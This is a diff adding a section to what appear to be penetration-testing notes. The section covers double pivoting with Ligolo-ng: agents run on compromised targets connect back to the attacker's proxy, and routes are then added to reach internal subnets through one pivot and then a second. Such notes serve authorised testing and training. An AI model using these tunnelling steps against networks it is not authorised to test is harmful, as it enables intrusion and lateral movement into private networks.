@@ -42,7 +42,87 @@ nxc smb 10.0.2.0/24 # The new subnet you've access to
 
 # Double Pivoting with Ligolo-ng
 
+## First Agent
 
+```sh
+sudo ip tuntap add user kali mode tun ligolo
+```
+
+```sh
+sudo ip link set ligolo up
+```
+
+```sh
+sudo ligolo-proxy -selfcert
+
+? Enable Ligolo-ng WebUI? No
+```
+
+Transfer the `agent` to the target
+
+```sh
+# On Target
+.\agent.exe -connect 10.10.15.1:11601 -ignore-cert
+```
+
+```sh
+# On Host
+ligolo-ng >> session
+? Specify a session: 1
+
+[Agent : ...] >> start --tun ligolo
+```
+
+```sh
+sudo ip route add 172.16.5.0/24 dev ligolo # Subnet we want to access
+```
+
+Test it:
+```sh
+ping 172.16.5.15
+```
+
+First pivot is done.
+
+Routes:
+```sh
+ip route
+```
+
+## Second Agent
+
+```sh
+sudo ip tuntap add user kali mode tun ligolo-double
+```
+
+```sh
+sudo ip link set ligolo-double up
+```
+
+```sh
+[Agent: ...] >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+
+[Agent: ...] >> listener_list
+```
+
+On second target:
+```sh
+.\agent.exe -connect 172.16.5.15:11601 -ignore-cert # Our first pivot's IP
+```
+
+On host:
+```sh
+[Agent: ...] >> session
+? Specify a session: 2
+```
+
+```sh
+sudo ip route add 172.16.6.0/24 dev ligolo-double
+```
+
+```sh
+[Agent: ...] >> start --tun ligolo-double
+```
 # SSH
 ## Single Port Forwarding
 
